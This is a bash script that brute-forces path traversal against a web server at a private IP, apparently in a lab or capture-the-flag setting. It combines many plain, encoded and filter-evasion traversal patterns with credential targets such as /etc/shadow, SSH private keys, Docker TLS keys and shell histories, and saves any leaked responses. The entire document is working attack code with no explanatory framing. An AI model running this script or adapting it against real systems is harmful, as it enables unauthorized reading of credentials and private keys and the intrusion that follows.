#!/bin/bash

TARGET="http://192.168.122.39"
OUTPUT_DIR="./traversal_results"
LOG_FILE="./traversal.log"
mkdir -p "$OUTPUT_DIR"
> "$LOG_FILE"  # Clear log file

# Target files to try reading
TARGETS=(
    "etc/passwd"
    "etc/shadow"
    "root/.docker/cert.pem"
    "root/.docker/key.pem"
    "root/.docker/ca.pem"
    "root/.ssh/id_rsa"
    "home/pamela/.ssh/id_rsa"
    "root/.bash_history"
    "home/pamela/.bash_history"
)

# Different traversal patterns
PATTERNS=(
    "/."
    "/../"
    "/../../"
    "/../../../"
    "/../../../../"
    "/../../../../../"
    "/../../../../../../"
    "/../../../../../../../"
    "/../../../../../../../../"
    "/../../../../../../../../../"
    "/../../../../../../../../../../"
    "/../../../../../../../../../../../"
    "/%2e%2e/"
    "/%2e%2e/%2e%2e/"
    "/%2e%2e/%2e%2e/%2e%2e/"
    "/%252e%252e/"
    "/%252e%252e/%252e%252e/"
    "/..%2f"
    "/..%2f..%2f"
    "/....//..../"
    "/....//....//..../"
    "/.%2e/"
    "/.%2e/.%2e/"
)

echo "[+] Starting path traversal tests against $TARGET"
echo "[+] Testing ${#TARGETS[@]} targets with ${#PATTERNS[@]} patterns"
echo "[+] Logging all attempts to $LOG_FILE"
echo ""

total=0
success=0

for target in "${TARGETS[@]}"; do
    for pattern in "${PATTERNS[@]}"; do
        url="${TARGET}${pattern}${target}"
        output_file="${OUTPUT_DIR}/$(echo ${pattern}${target} | tr '/' '_' | tr '%' '_').txt"
        
        # Make request and save response
        response=$(curl -s -w "\n---STATUS:%{http_code}---" "$url" 2>&1)
        status=$(echo "$response" | grep -o "STATUS:[0-9]*" | cut -d: -f2)
        
        total=$((total + 1))
        
        # Log every attempt
        if [[ "$status" == "200" ]]; then
            echo "[SUCCESS] HTTP $status - $url" | tee -a "$LOG_FILE"
            echo "$response" > "$output_file"
            echo "$response" | head -20
            echo ""
            success=$((success + 1))
        else
            echo "[FAIL] HTTP $status - $url" >> "$LOG_FILE"
        fi
    done
done

echo ""
echo "[+] Test complete: $success/$total successful"
echo "[+] All attempts logged to $LOG_FILE"
echo "[+] Results saved to $OUTPUT_DIR/"
ls -lh "$OUTPUT_DIR/" 2>/dev/null